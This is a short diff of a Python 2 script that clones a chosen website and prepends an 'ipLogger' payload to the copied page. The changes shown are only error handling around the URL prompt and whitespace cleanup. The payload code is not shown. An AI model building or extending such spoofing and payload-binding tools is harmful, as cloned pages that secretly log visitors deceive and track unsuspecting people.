@@ -14,11 +14,14 @@ if checkIfExist == 0:
 # delete spoofed.html if exist (has old data as backup)
 if checkIfExist == 1:
     os.remove(fileName)
-    
-print 'Enter website url to spoof e.g (http://google.com)\n'
 
-url = raw_input()
-print "\n"
+try:
+    print 'Enter website url to spoof e.g (http://google.com)\n'
+    url = raw_input()
+    print "\n"
+    
+except IOError:
+    print "Must be used as http://yoursite.com"
 
 # download the website files (code for now)
 os.system("cls") 
@@ -47,8 +50,10 @@ if payload == '1':
     
     makePage = open (newFileName, 'a') ## a will append, w will over-write
     makePage.write(ipLogger)           ## write the ip logger module
-    makePage.write(fileContent)		   ## write downloaded html/php code
-    makePage.close()				   ## discontinue editing of file
+    makePage.write(fileContent)	       ## write downloaded html/php code
+    makePage.close()		       ## discontinue editing of file
     print '\nBound payload(s) successfully! Exiting in 4 seconds...'
     os.remove(fileName)
-    time.sleep(4)					   ## give user time to read
+    time.sleep(4)		       ## give user time to read
+
+    
